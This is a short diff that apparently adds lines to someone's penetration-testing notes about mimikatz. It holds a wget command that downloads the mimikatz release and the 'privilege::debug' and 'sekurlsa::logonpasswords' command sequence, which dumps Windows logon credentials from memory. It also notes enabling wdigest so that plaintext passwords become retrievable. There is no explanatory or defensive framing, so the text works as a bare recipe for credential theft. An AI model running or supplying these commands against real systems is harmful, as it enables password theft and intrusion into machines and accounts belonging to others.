@@ -170,4 +170,15 @@ https://github.com/gentilkiwi/mimikatz
 
 https://github.com/gentilkiwi/mimikatz/releases
 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20191125/mimikatz_trunk.7z
+https://github.com/gentilkiwi/mimikatz/wiki
+
+mimikatz.exe
+
+privilege::debug
+20 OK
+sekurlsa::logonpasswords
+
+turn on wdigest with mimikatz
+
+
 
